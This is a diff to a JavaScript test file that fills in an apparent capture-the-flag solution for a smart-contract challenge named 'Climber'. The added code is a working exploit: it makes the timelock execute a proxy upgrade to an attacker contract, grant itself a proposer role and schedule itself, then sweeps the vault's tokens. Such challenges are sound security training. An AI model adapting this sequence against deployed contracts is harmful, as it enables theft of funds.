@@ -72,17 +72,32 @@ describe("[Challenge] Climber", function () {
       this.evilUpgrade.address
     );
 
-    let ABI = ["function upgradeTo(address newImplementation)"];
-    let iface = new ethers.utils.Interface(ABI);
+    let upgradeToABI = ["function upgradeTo(address newImplementation)"];
+    let upgradeToIface = new ethers.utils.Interface(upgradeToABI);
+    let upgradeToBytes = upgradeToIface.encodeFunctionData("upgradeTo", [
+      this.evilUpgrade.address,
+    ]);
 
-    // await this.timelock.connect(attacker).execute(
-    //   [this.vault.address, this.timelock.address, this.scheduler.address],
-    //   [0,0,0],
-    //   []
-    // )
-    console.log(
-      iface.encodeFunctionData("upgradeTo", [this.evilUpgrade.address])
-    );
+    let grantRoleABI = ["function grantRole(bytes32 role, address account)"];
+    let grantRoleIface = new ethers.utils.Interface(grantRoleABI);
+    let grantRoleBytes = grantRoleIface.encodeFunctionData("grantRole", [
+      "0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1",
+      this.scheduler.address,
+    ]);
+
+    let scheduleABI = ["function schedule()"];
+    let scheduleIface = new ethers.utils.Interface(scheduleABI);
+    let scheduleBytes = scheduleIface.encodeFunctionData("schedule", []);
+
+    await this.timelock
+      .connect(attacker)
+      .execute(
+        [this.vault.address, this.timelock.address, this.scheduler.address],
+        [0, 0, 0],
+        [upgradeToBytes, grantRoleBytes, scheduleBytes],
+        "0x0000000000000000000000000000000000000000000000000000000000000040"
+      );
+    await this.vault.connect(attacker).sweepFunds(this.token.address);
   });
 
   after(async function () {
